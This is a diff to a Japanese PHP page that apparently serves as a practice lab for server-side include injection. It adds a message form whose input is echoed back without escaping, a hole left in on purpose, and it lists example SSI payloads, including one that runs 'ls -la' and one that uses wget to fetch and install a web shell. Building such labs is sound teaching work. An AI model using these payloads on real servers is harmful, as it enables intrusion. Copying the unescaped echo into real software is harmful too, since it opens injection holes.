@@ -1,3 +1,13 @@
+<?php
+
+// セッションを開始
+session_start();
+
+if (isset($_POST['message'])) {
+    $message = $_POST['message'];
+}
+
+?>
 <!DOCTYPE html>
 <html lang="ja">
 <head>
@@ -41,11 +51,22 @@
         <br/>
         ・サーバー内部でコマンドを実行させる例
         <code>&lt;!--#exec cmd=&quot;ls -la&quot; --&gt;</code>
+        <br/>
+        ・サーバー内にWeb-Shellをアップロードする例
+        <code>&lt;!--#exec cmd=&quot;wget http://web/webshell.txt -O webshell.php&quot; --&gt;</code>
     </pre>
 </div>
-<h2>以下にexecコマンドが実行された結果が表示される:</h2>
-<pre>
-<!--#exec cmd="ls -la" -->
-</pre>
+<form action="index.php" method="POST">
+    <label for="message">メッセージを入力してください:</label><br>
+    <input type="text" id="message" name="message"><br><br>
+    <button type="submit">送信</button>
+</form>
+
+<?php
+if (isset($message) && '' !== $message) {
+    echo "<h2>投稿されたメッセージ</h2>";
+    echo "<pre>" . $message . "</pre>";
+}
+?>
 </body>
 </html>
